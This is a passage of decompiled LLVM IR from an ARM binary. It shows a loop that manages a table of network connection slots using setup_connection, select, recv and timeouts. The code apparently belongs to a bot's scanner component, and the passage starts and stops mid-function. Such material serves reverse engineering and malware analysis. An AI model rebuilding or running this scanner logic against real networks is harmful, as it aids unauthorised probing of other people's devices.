  store i32 %v3_fd60, i32* %v3_fde0, align 4
  %v0_fde4 = load i32, i32* %ip.global-to-local, align 4
  %v1_fde4 = trunc i32 %v0_fde4 to i16
  %v2_fde4 = load i32, i32* @r0, align 4
  %v3_fde4 = add i32 %v2_fde4, 20
  %v4_fde4 = inttoptr i32 %v3_fde4 to i16*
  store i16 %v1_fde4, i16* %v4_fde4, align 2
  %v0_fde8 = call i32 @setup_connection()
  store i32 %v0_fde8, i32* %r0.global-to-local, align 4
  %v1_fc6c.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_fc68

dec_label_pc_fdf0:                                ; preds = %dec_label_pc_f6a0
  store i32 ptrtoint (i32* @global_var_260d4.178 to i32), i32* %ip.global-to-local, align 4
  %v2_fdf4 = load i32, i32* @global_var_260d4.178, align 4
  store i32 %v2_fdf4, i32* %r0.global-to-local, align 4
  %v1_fdf8 = call i32 @__GI___libc_close(i32 %v2_fdf4)
  store i32 %v1_fdf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fdfc

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_f67c, %dec_label_pc_fdf0
  %v0_fdfc = load i32, i32* @r5, align 4
  store i32 %v0_fdfc, i32* %r0.global-to-local, align 4
  %v1_fe00 = call i32 @__GI_exit(i32 %v0_fdfc)
  store i32 %v1_fe00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe04

dec_label_pc_fe04.loopexit:                       ; preds = %dec_label_pc_fdb4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fe04

dec_label_pc_fe04:                                ; preds = %dec_label_pc_fdd8, %dec_label_pc_fd70, %dec_label_pc_fc9c, %dec_label_pc_fc68, %dec_label_pc_fe04.loopexit, %dec_label_pc_fdfc
  %stack_var_-1880.1 = phi i32 [ %tmp314, %dec_label_pc_fdfc ], [ %stack_var_-1880.0, %dec_label_pc_fe04.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_fc68 ], [ %stack_var_-1880.0, %dec_label_pc_fc9c ], [ %stack_var_-1880.0, %dec_label_pc_fd70 ], [ %stack_var_-1880.0, %dec_label_pc_fdd8 ]
  %stack_var_-1876.1 = phi i16 [ %tmp342, %dec_label_pc_fdfc ], [ %stack_var_-1876.0, %dec_label_pc_fe04.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_fc68 ], [ %stack_var_-1876.0, %dec_label_pc_fc9c ], [ %stack_var_-1876.0, %dec_label_pc_fd70 ], [ %stack_var_-1876.0, %dec_label_pc_fdd8 ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 1668, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fe20486 = load i32, i32* @sp, align 4
  %v3_fe20487 = add i32 %v2_fe20486, 1668
  %v4_fe20488 = inttoptr i32 %v3_fe20487 to i32*
  store i32 0, i32* %v4_fe20488, align 4
  br label %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge

dec_label_pc_fe10.dec_label_pc_fe10_crit_edge:    ; preds = %dec_label_pc_fe04, %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge
  %v0_fe10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fe10 = add i32 %v0_fe10.pre, 1664
  store i32 %v1_fe10, i32* %ip.global-to-local, align 4
  %v1_fe14 = add i32 %v0_fe10.pre, 4
  store i32 %v1_fe14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_fe1c = icmp eq i32 %v1_fe14, 128
  %v2_fe20 = load i32, i32* @sp, align 4
  %v3_fe20 = add i32 %v2_fe20, %v1_fe10
  %v4_fe20 = inttoptr i32 %v3_fe20 to i32*
  store i32 0, i32* %v4_fe20, align 4
  br i1 %v7_fe1c, label %dec_label_pc_fe28, label %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge

dec_label_pc_fe28:                                ; preds = %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fe28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_fe28, i32* %stack_var_-352, align 4
  %v1_fe30480 = add i32 %v0_fe28, 1540
  store i32 %v1_fe30480, i32* @lr, align 4
  %v1_fe34481 = add i32 %v0_fe28, 8
  store i32 %v1_fe34481, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_fe3c482 = icmp eq i32 %v1_fe34481, 128
  %v2_fe40483 = load i32, i32* @sp, align 4
  %v3_fe40484 = add i32 %v2_fe40483, %v1_fe30480
  %v4_fe40485 = inttoptr i32 %v3_fe40484 to i32*
  store i32 0, i32* %v4_fe40485, align 4
  br i1 %v7_fe3c482, label %dec_label_pc_fe48, label %dec_label_pc_fe30.dec_label_pc_fe30_crit_edge

dec_label_pc_fe30.dec_label_pc_fe30_crit_edge:    ; preds = %dec_label_pc_fe28, %dec_label_pc_fe30.dec_label_pc_fe30_crit_edge
  %v0_fe30.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_fe30 = add i32 %v0_fe30.pre, 1536
  store i32 %v1_fe30, i32* @lr, align 4
  %v1_fe34 = add i32 %v0_fe30.pre, 4
  store i32 %v1_fe34, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_fe3c = icmp eq i32 %v1_fe34, 128
  %v2_fe40 = load i32, i32* @sp, align 4
  %v3_fe40 = add i32 %v2_fe40, %v1_fe30
  %v4_fe40 = inttoptr i32 %v3_fe40 to i32*
  store i32 0, i32* %v4_fe40, align 4
  br i1 %v7_fe3c, label %dec_label_pc_fe48, label %dec_label_pc_fe30.dec_label_pc_fe30_crit_edge

dec_label_pc_fe48:                                ; preds = %dec_label_pc_fe30.dec_label_pc_fe30_crit_edge, %dec_label_pc_fe28
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fe48 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_fe48, i32* @r6, align 4
  store i32 %v0_fe48, i32* @r5, align 4
  %v5_fe50 = trunc i32 %v0_fe48 to i16
  store i16 %v5_fe50, i16* %stack_var_-52, align 2
  %v2_10cec = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_fea8

dec_label_pc_fe58:                                ; preds = %dec_label_pc_fed8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fec4, i1* %cpsr_z.global-to-local, align 1
  %v1_10cdc = add i32 %v2_febc, 4
  %v2_10cdc = inttoptr i32 %v1_10cdc to i32*
  %v3_10cdc = load i32, i32* %v2_10cdc, align 4
  br i1 %v7_fec4, label %dec_label_pc_10cdc, label %dec_label_pc_fe60

dec_label_pc_fe60:                                ; preds = %dec_label_pc_fe58
  store i32 %v3_10cdc, i32* %ip.global-to-local, align 4
  %v3_fe68 = udiv i32 %v3_10cdc, 32
  store i32 %v2_10cec, i32* %r0.global-to-local, align 4
  %v3_fe70 = mul nuw nsw i32 %v3_fe68, 4
  %v2_fe74 = add i32 %v3_fe70, %v2_10cec
  store i32 %v2_fe74, i32* %r3.global-to-local, align 4
  %v1_fe78 = add i32 %v2_fe74, -184
  %v2_fe78 = inttoptr i32 %v1_fe78 to i32*
  %v3_fe78 = load i32, i32* %v2_fe78, align 4
  %v1_fe7c = urem i32 %v3_10cdc, 32
  store i32 %v1_fe7c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_fe84 = shl i32 1, %v1_fe7c
  %v8_fe84 = or i32 %v3_fe78, %v7_fe84
  store i32 %v8_fe84, i32* %r2.global-to-local, align 4
  store i32 %v8_fe84, i32* %v2_fe78, align 4
  %v0_fe8c = load i32, i32* @r6, align 4
  %v1_fe8c = load i32, i32* %ip.global-to-local, align 4
  %v3_fe8c = icmp uge i32 %v0_fe8c, %v1_fe8c
  store i1 %v3_fe8c, i1* %cpsr_c.global-to-local, align 1
  %v9_fe8c = icmp eq i32 %v0_fe8c, %v1_fe8c
  store i1 %v9_fe8c, i1* %cpsr_z.global-to-local, align 1
  %v5_fe90 = icmp slt i32 %v0_fe8c, %v1_fe8c
  br i1 %v5_fe90, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_fe60
  store i32 %v1_fe8c, i32* @r6, align 4
  br label %bb378

bb378:                                            ; preds = %.thread56, %bb384, %bb382, %bb428, %dec_label_pc_ff3c, %dec_label_pc_fe60, %bb377
  %v3_fe94 = load i16, i16* %stack_var_-52, align 2
  %v4_fe94 = sext i16 %v3_fe94 to i32
  store i32 %v4_fe94, i32* %r3.global-to-local, align 4
  %v1_fe98 = add nsw i32 %v4_fe94, 1
  store i32 %v1_fe98, i32* %r2.global-to-local, align 4
  %v2_fe9c = icmp ugt i32 %v1_fe98, 254
  store i1 %v2_fe9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe9c = icmp eq i32 %v1_fe98, 255
  store i1 %v7_fe9c, i1* %cpsr_z.global-to-local, align 1
  %v5_fea0 = trunc i32 %v1_fe98 to i16
  store i16 %v5_fea0, i16* %stack_var_-52, align 2
  %v8_fea4 = icmp sgt i16 %v3_fe94, 254
  br i1 %v8_fea4, label %dec_label_pc_ff48, label %dec_label_pc_fea8

dec_label_pc_fea8:                                ; preds = %bb378, %dec_label_pc_fe48
  %v0_feb4 = phi i32 [ %v1_fe98, %bb378 ], [ %v0_fe48, %dec_label_pc_fe48 ]
  store i32 ptrtoint (i32* @global_var_260d0.176 to i32), i32* %r0.global-to-local, align 4
  %v3_feac = mul i32 %v0_feb4, 256
  store i32 %v3_feac, i32* %r3.global-to-local, align 4
  %v2_feb0 = load i32, i32* @global_var_260d0.176, align 4
  store i32 %v2_feb0, i32* @r1, align 4
  %v2_feb8 = mul i32 %v0_feb4, 288
  store i32 %v2_feb8, i32* %r2.global-to-local, align 4
  %v2_febc = add i32 %v2_feb0, %v2_feb8
  store i32 %v2_febc, i32* @r4, align 4
  %v1_fec0 = add i32 %v2_febc, 12
  %v2_fec0 = inttoptr i32 %v1_fec0 to i32*
  %v3_fec0 = load i32, i32* %v2_fec0, align 4
  store i32 %v3_fec0, i32* %ip.global-to-local, align 4
  %v2_fec4 = icmp ne i32 %v3_fec0, 0
  store i1 %v2_fec4, i1* %cpsr_c.global-to-local, align 1
  %v7_fec4 = icmp eq i32 %v3_fec0, 1
  store i1 %v7_fec4, i1* %cpsr_z.global-to-local, align 1
  %v2_fec8 = xor i1 %v2_fec4, true
  %v3_fec8 = or i1 %v7_fec4, %v2_fec8
  br i1 %v3_fec8, label %bb379, label %bb380

bb379:                                            ; preds = %dec_label_pc_fea8
  store i32 5, i32* @r1, align 4
  br label %bb380

bb380:                                            ; preds = %dec_label_pc_fea8, %bb379
  %v1_fee8173 = phi i32 [ %v2_feb0, %dec_label_pc_fea8 ], [ 5, %bb379 ]
  %v2_fecc = xor i1 %v7_fec4, true
  %v3_fecc = and i1 %v2_fec4, %v2_fecc
  br i1 %v3_fecc, label %bb381, label %bb382

bb381:                                            ; preds = %bb380
  store i32 30, i32* @r1, align 4
  br label %bb382

bb382:                                            ; preds = %bb380, %bb381
  %v1_fee8 = phi i32 [ %v1_fee8173, %bb380 ], [ 30, %bb381 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fed0 = icmp eq i32 %v3_fec0, 0
  store i1 %v2_fed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fed0, label %bb378, label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %bb382
  store i32 ptrtoint (i32* @global_var_235f0.165 to i32), i32* %r2.global-to-local, align 4
  %v2_fedc = load i32, i32* @global_var_235f0.165, align 4
  store i32 %v2_fedc, i32* %r3.global-to-local, align 4
  %v1_fee0 = add i32 %v2_febc, 8
  %v2_fee0 = inttoptr i32 %v1_fee0 to i32*
  %v3_fee0 = load i32, i32* %v2_fee0, align 4
  store i32 %v3_fee0, i32* %r2.global-to-local, align 4
  %v2_fee4 = sub i32 %v2_fedc, %v3_fee0
  store i32 %v2_fee4, i32* %r3.global-to-local, align 4
  %v3_fee8 = icmp uge i32 %v2_fee4, %v1_fee8
  store i1 %v3_fee8, i1* %cpsr_c.global-to-local, align 1
  %v9_fee8 = icmp eq i32 %v2_fee4, %v1_fee8
  store i1 %v9_fee8, i1* %cpsr_z.global-to-local, align 1
  %v2_feec = xor i1 %v3_fee8, true
  %v3_feec = or i1 %v9_fee8, %v2_feec
  br i1 %v3_feec, label %dec_label_pc_fe58, label %dec_label_pc_fef0

dec_label_pc_fef0:                                ; preds = %dec_label_pc_fed8
  %v1_fef0 = add i32 %v2_febc, 4
  %v2_fef0 = inttoptr i32 %v1_fef0 to i32*
  %v3_fef0 = load i32, i32* %v2_fef0, align 4
  store i32 %v3_fef0, i32* %r0.global-to-local, align 4
  %v1_fef4 = call i32 @__GI___libc_close(i32 %v3_fef0)
  store i32 %v1_fef4, i32* %r0.global-to-local, align 4
  %v0_fef8 = load i32, i32* @r4, align 4
  %v1_fef8 = add i32 %v0_fef8, 12
  %v2_fef8 = inttoptr i32 %v1_fef8 to i32*
  %v3_fef8 = load i32, i32* %v2_fef8, align 4
  store i32 %v3_fef8, i32* %r3.global-to-local, align 4
  %v2_fefc = icmp ugt i32 %v3_fef8, 1
  store i1 %v2_fefc, i1* %cpsr_c.global-to-local, align 1
  %v7_fefc = icmp eq i32 %v3_fef8, 2
  store i1 %v7_fefc, i1* %cpsr_z.global-to-local, align 1
  %v2_ff00 = xor i1 %v2_fefc, true
  %v3_ff00 = or i1 %v7_fefc, %v2_ff00
  br i1 %v3_ff00, label %bb383, label %.thread279

.thread279:                                       ; preds = %dec_label_pc_fef0
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ff08276280 = add i32 %v0_fef8, 4
  %v3_ff08277281 = inttoptr i32 %v2_ff08276280 to i32*
  store i32 -1, i32* %v3_ff08277281, align 4
  br label %bb384

bb383:                                            ; preds = %dec_label_pc_fef0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ff08273 = add i32 %v0_fef8, 4
  %v3_ff08274 = inttoptr i32 %v2_ff08273 to i32*
  store i32 -1, i32* %v3_ff08274, align 4
  %v4_ff0c = load i32, i32* %r3.global-to-local, align 4
  %v5_ff0c = load i32, i32* @r4, align 4
  %v6_ff0c = add i32 %v5_ff0c, 12
  %v7_ff0c = inttoptr i32 %v6_ff0c to i32*
  store i32 %v4_ff0c, i32* %v7_ff0c, align 4
  %v4_ff10 = load i32, i32* %r3.global-to-local, align 4
  %v5_ff10 = trunc i32 %v4_ff10 to i8
  %v6_ff10 = load i32, i32* @r4, align 4
  %v7_ff10 = add i32 %v6_ff10, 284
  %v8_ff10 = inttoptr i32 %v7_ff10 to i8*
  store i8 %v5_ff10, i8* %v8_ff10, align 1
  %v0_ff14.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ff14.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb384

bb384:                                            ; preds = %.thread279, %bb383
  %v1_ff14 = phi i1 [ %v1_ff14.pre, %bb383 ], [ %v2_fefc, %.thread279 ]
  %v0_ff14 = phi i1 [ %v0_ff14.pre, %bb383 ], [ false, %.thread279 ]
  %v2_ff14 = xor i1 %v1_ff14, true
  %v3_ff14 = or i1 %v0_ff14, %v2_ff14
  br i1 %v3_ff14, label %bb378, label %dec_label_pc_ff18

dec_label_pc_ff18:                                ; preds = %bb384
  %v0_ff18 = load i32, i32* @r4, align 4
  %v1_ff18 = add i32 %v0_ff18, 284
  %v2_ff18 = inttoptr i32 %v1_ff18 to i8*
  %v3_ff18 = load i8, i8* %v2_ff18, align 1
  %v4_ff18 = zext i8 %v3_ff18 to i32
  %v1_ff1c = add nuw nsw i32 %v4_ff18, 1
  %v1_ff20 = urem i32 %v1_ff1c, 256
  store i32 %v1_ff20, i32* %r3.global-to-local, align 4
  %v2_ff24 = icmp ugt i32 %v1_ff20, 9
  store i1 %v2_ff24, i1* %cpsr_c.global-to-local, align 1
  %v7_ff24 = icmp eq i32 %v1_ff20, 10
  store i1 %v7_ff24, i1* %cpsr_z.global-to-local, align 1
  %v1_ff28 = trunc i32 %v1_ff1c to i8
  store i8 %v1_ff28, i8* %v2_ff18, align 1
  %v0_ff2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff2c, label %.thread56, label %dec_label_pc_ff3c

.thread56:                                        ; preds = %dec_label_pc_ff18
  %v1_ff2c = load i32, i32* %r3.global-to-local, align 4
  %v2_ff2c = add i32 %v1_ff2c, -10
  store i32 %v2_ff2c, i32* %r3.global-to-local, align 4
  %v2_ff30 = load i32, i32* @r4, align 4
  %v3_ff30 = add i32 %v2_ff30, 12
  %v4_ff30 = inttoptr i32 %v3_ff30 to i32*
  store i32 %v2_ff2c, i32* %v4_ff30, align 4
  %v1_ff34 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff34 = trunc i32 %v1_ff34 to i8
  %v3_ff34 = load i32, i32* @r4, align 4
  %v4_ff34 = add i32 %v3_ff34, 284
  %v5_ff34 = inttoptr i32 %v4_ff34 to i8*
  store i8 %v2_ff34, i8* %v5_ff34, align 1
  %v0_ff38.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff38.pr.pr, label %bb378, label %dec_label_pc_ff3c

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_ff18, %.thread56
  %v0_ff3c = load i32, i32* @r4, align 4
  store i32 %v0_ff3c, i32* @r0, align 4
  %v0_ff40 = call i32 @setup_connection()
  store i32 %v0_ff40, i32* %r0.global-to-local, align 4
  br label %bb378

dec_label_pc_ff48:                                ; preds = %bb378
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_ff54 = load i32, i32* @r5, align 4
  %v1_ff54 = load i32, i32* @r6, align 4
  %v3_ff54 = icmp uge i32 %v0_ff54, %v1_ff54
  store i1 %v3_ff54, i1* %cpsr_c.global-to-local, align 1
  %v9_ff54 = icmp eq i32 %v0_ff54, %v1_ff54
  store i1 %v9_ff54, i1* %cpsr_z.global-to-local, align 1
  %v5_ff58 = icmp slt i32 %v0_ff54, %v1_ff54
  %storemerge134 = select i1 %v5_ff58, i32 %v1_ff54, i32 %v0_ff54
  %v2_ff64 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_ff64, i32* %ip.global-to-local, align 4
  %v2_ff68 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_ff68, i32* %r1.global-to-local, align 4
  %v2_ff6c = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_ff6c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ff74 = add i32 %storemerge134, 1
  store i32 %v1_ff74, i32* %r0.global-to-local, align 4
  %v5_ff80 = call i32 @__libc_select(i32 %v1_ff74, i32 %v2_ff68, i32 %v2_ff6c, i32 0, i32 %v2_ff64)
  %v0_ff84 = load i32, i32* @r4, align 4
  store i32 %v0_ff84, i32* %r0.global-to-local, align 4
  %v1_ff88 = inttoptr i32 %v0_ff84 to i32*
  %v2_ff88 = call i32 @__GI_time(i32* %v1_ff88)
  store i32 %v2_ff88, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_235f0.165 to i32), i32* @lr, align 4
  %v0_ff90 = load i32, i32* @r4, align 4
  %v5_ff90 = trunc i32 %v0_ff90 to i16
  store i16 %v5_ff90, i16* %stack_var_-52, align 2
  store i32 %v2_ff88, i32* @global_var_235f0.165, align 4
  %v2_1096c = ptrtoint i32* %stack_var_-45 to i32
  %v2_10980 = ptrtoint i32* %stack_var_-80 to i32
  %v2_10988 = ptrtoint i32* %stack_var_-77 to i32
  %v2_1073c = ptrtoint i32* %stack_var_-60 to i32
  %v2_10750 = ptrtoint i8* %stack_var_-56 to i32
  %v2_10758 = bitcast i8* %stack_var_-56 to i32*
  %v2_10a78 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_ff98

dec_label_pc_ff98:                                ; preds = %dec_label_pc_1010c, %dec_label_pc_ff48
  %v0_ffa4 = phi i32 [ %v1_10110, %dec_label_pc_1010c ], [ %v0_ff90, %dec_label_pc_ff48 ]
  store i32 ptrtoint (i32* @global_var_260d0.176 to i32), i32* %r0.global-to-local, align 4
  %v3_ff9c = mul i32 %v0_ffa4, 256
  store i32 %v3_ff9c, i32* %r3.global-to-local, align 4
  %v2_ffa0 = load i32, i32* @global_var_260d0.176, align 4
  store i32 %v2_ffa0, i32* %r1.global-to-local, align 4
  %v2_ffa8 = mul i32 %v0_ffa4, 288
  store i32 %v2_ffa8, i32* %r2.global-to-local, align 4
  %v2_ffac = add i32 %v2_ffa0, %v2_ffa8
  store i32 %v2_ffac, i32* @r5, align 4
  %v1_ffb0 = add i32 %v2_ffac, 4
  %v2_ffb0 = inttoptr i32 %v1_ffb0 to i32*
  %v3_ffb0 = load i32, i32* %v2_ffb0, align 4
  store i32 %v3_ffb0, i32* %r0.global-to-local, align 4
  %v2_ffb4 = icmp eq i32 %v3_ffb0, -1
  store i1 %v2_ffb4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffb4 = icmp eq i32 %v3_ffb0, -1
  store i1 %v7_ffb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffb4, label %dec_label_pc_1010c, label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %dec_label_pc_ff98
  %v3_ffbc = udiv i32 %v3_ffb0, 32
  store i32 %v2_10cec, i32* %r1.global-to-local, align 4
  %v3_ffc8 = mul nuw nsw i32 %v3_ffbc, 4
  store i32 %v3_ffc8, i32* @ip, align 4
  %v2_ffcc = add i32 %v3_ffc8, %v2_10cec
  store i32 %v2_ffcc, i32* %r2.global-to-local, align 4
  %v1_ffd0 = add i32 %v2_ffcc, -312
  %v2_ffd0 = inttoptr i32 %v1_ffd0 to i32*
  %v3_ffd0 = load i32, i32* %v2_ffd0, align 4
  %v1_ffd4 = urem i32 %v3_ffb0, 32
  store i32 %v1_ffd4, i32* %r1.global-to-local, align 4
  %v2_ffd8 = add nsw i32 %v1_ffd4, -1
  %v3_ffd8 = shl i32 1, %v2_ffd8
  %v4_ffd8 = and i32 %v3_ffd0, %v3_ffd8
  %v5_ffd8 = icmp ne i32 %v4_ffd8, 0
  store i1 %v5_ffd8, i1* %cpsr_c.global-to-local, align 1
  %v6_ffd8 = ashr i32 %v3_ffd0, %v1_ffd4
  store i32 %v6_ffd8, i32* %r3.global-to-local, align 4
  %v1_ffdc = urem i32 %v6_ffd8, 2
  %v2_ffdc = icmp eq i32 %v1_ffdc, 0
  store i1 %v2_ffdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffdc, label %dec_label_pc_ffe4, label %dec_label_pc_10b5c

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ffbc, %dec_label_pc_10c0c
  %v1_fff4 = phi i32 [ %v1_ffd4, %dec_label_pc_ffbc ], [ %v1_fff4.pre, %dec_label_pc_10c0c ]
  %v0_ffec = phi i32 [ %v3_ffc8, %dec_label_pc_ffbc ], [ %v0_ffec.pre, %dec_label_pc_10c0c ]
  store i32 %v2_10cec, i32* %r3.global-to-local, align 4
  %v2_ffec = add i32 %v0_ffec, %v2_10cec
  store i32 %v2_ffec, i32* %r2.global-to-local, align 4
  %v1_fff0 = add i32 %v2_ffec, -184
  %v2_fff0 = inttoptr i32 %v1_fff0 to i32*
  %v3_fff0 = load i32, i32* %v2_fff0, align 4
  %v2_fff4 = add i32 %v1_fff4, -1
  %v3_fff4 = shl i32 1, %v2_fff4
  %v4_fff4 = and i32 %v3_fff0, %v3_fff4
  %v5_fff4 = icmp ne i32 %v4_fff4, 0
  store i1 %v5_fff4, i1* %cpsr_c.global-to-local, align 1
  %v6_fff4 = ashr i32 %v3_fff0, %v1_fff4
  store i32 %v6_fff4, i32* %r3.global-to-local, align 4
  %v1_fff8 = urem i32 %v6_fff4, 2
  %v2_fff8 = icmp eq i32 %v1_fff8, 0
  store i1 %v2_fff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fff8, label %dec_label_pc_1010c, label %dec_label_pc_10000.preheader

dec_label_pc_10000.preheader:                     ; preds = %dec_label_pc_ffe4
  %v0_10000156 = load i32, i32* @r5, align 4
  %v1_10000157 = add i32 %v0_10000156, 12
  %v2_10000158 = inttoptr i32 %v1_10000157 to i32*
  %v3_10000159 = load i32, i32* %v2_10000158, align 4
  store i32 %v3_10000159, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10004155161 = icmp eq i32 %v3_10000159, 0
  store i1 %v2_10004155161, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10004155161, label %dec_label_pc_1010c, label %dec_label_pc_1000c.lr.ph

dec_label_pc_10000.loopexit:                      ; preds = %dec_label_pc_10a1c, %dec_label_pc_1088c
  %v0_10000 = load i32, i32* @r5, align 4
  %v1_10000 = add i32 %v0_10000, 12
  %v2_10000 = inttoptr i32 %v1_10000 to i32*
  %v3_10000 = load i32, i32* %v2_10000, align 4
  store i32 %v3_10000, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10004155 = icmp eq i32 %v3_10000, 0
  store i1 %v2_10004155, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10004155, label %dec_label_pc_1010c, label %dec_label_pc_1000c.lr.ph

dec_label_pc_1000c.lr.ph:                         ; preds = %dec_label_pc_10000.preheader, %dec_label_pc_10000.loopexit
  %v0_1000c189 = phi i32 [ %v0_10000, %dec_label_pc_10000.loopexit ], [ %v0_10000156, %dec_label_pc_10000.preheader ]
  br label %dec_label_pc_1000c

dec_label_pc_1000c:                               ; preds = %dec_label_pc_10004.backedge.thread, %dec_label_pc_10004.backedge, %dec_label_pc_10004.backedge.thread528, %dec_label_pc_1000c.lr.ph
  %v0_10aec = phi i32 [ %v0_1000c189, %dec_label_pc_1000c.lr.ph ], [ %v0_1000c186, %dec_label_pc_10004.backedge ], [ %v0_10080, %dec_label_pc_10004.backedge.thread ], [ %v0_10080, %dec_label_pc_10004.backedge.thread528 ]
  %v1_1000c = add i32 %v0_10aec, 24
  %v2_1000c = inttoptr i32 %v1_1000c to i32*
  %v3_1000c = load i32, i32* %v2_1000c, align 4
  store i32 %v3_1000c, i32* @r3, align 4
  %v2_10010 = icmp ugt i32 %v3_1000c, 255
  store i1 %v2_10010, i1* %cpsr_c.global-to-local, align 1
  %v7_10010 = icmp eq i32 %v3_1000c, 256
  store i1 %v7_10010, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_10aec, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_10010, label %dec_label_pc_10aec, label %dec_label_pc_1001c

dec_label_pc_1001c:                               ; preds = %dec_label_pc_1000c, %dec_label_pc_10aec
  store i32 0, i32* @r6, align 4
  %v1_10020 = load i32, i32* @sb, align 4
  %v2_10020 = inttoptr i32 %v1_10020 to i32*
  store i32 0, i32* %v2_10020, align 4
  %v0_10024 = load i32, i32* @r5, align 4
  %v1_10024 = add i32 %v0_10024, 24
  %v2_10024 = inttoptr i32 %v1_10024 to i32*
  %v3_10024 = load i32, i32* %v2_10024, align 4
  store i32 %v3_10024, i32* %r2.global-to-local, align 4
  %v0_10028 = load i32, i32* @sl, align 4
  %v2_10028 = add i32 %v0_10028, %v3_10024
  store i32 %v2_10028, i32* @r4, align 4
  %v1_1002c = add i32 %v0_10024, 4
  %v2_1002c = inttoptr i32 %v1_1002c to i32*
  %v3_1002c = load i32, i32* %v2_1002c, align 4
  store i32 %v3_1002c, i32* %r0.global-to-local, align 4
  %v1_10030 = sub i32 256, %v3_10024
  store i32 %v1_10030, i32* %r2.global-to-local, align 4
  store i32 %v2_10028, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1003c = call i32 @__libc_recv(i32 %v3_1002c, i32 %v2_10028, i32 %v1_10030, i32 16384)
  store i32 %v4_1003c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10040 = icmp eq i32 %v4_1003c, 0
  store i1 %v2_10040, i1* %cpsr_z.global-to-local, align 1
  %tmp385 = icmp slt i32 %v4_1003c, 1
  br i1 %tmp385, label %dec_label_pc_100b8, label %dec_label_pc_10048

dec_label_pc_10048:                               ; preds = %dec_label_pc_1001c
  %v0_10048 = load i32, i32* @r6, align 4
  store i32 %v0_10048, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %.thread63, %dec_label_pc_10048
  %v3_10058 = phi i32 [ %v1_1005c, %.thread63 ], [ %v0_10048, %dec_label_pc_10048 ]
  %v1_1004c = load i32, i32* @r4, align 4
  %v2_1004c = add i32 %v1_1004c, %v3_10058
  %v3_1004c = inttoptr i32 %v2_1004c to i8*
  %v4_1004c = load i8, i8* %v3_1004c, align 1
  %v6_1004c = zext i8 %v4_1004c to i32
  store i32 %v6_1004c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10050 = icmp eq i8 %v4_1004c, 0
  store i1 %v2_10050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10050, label %bb386, label %.thread63

bb386:                                            ; preds = %dec_label_pc_1004c
  %v2_10054 = add nuw nsw i32 %v6_1004c, 65
  store i32 %v2_10054, i32* %r3.global-to-local, align 4
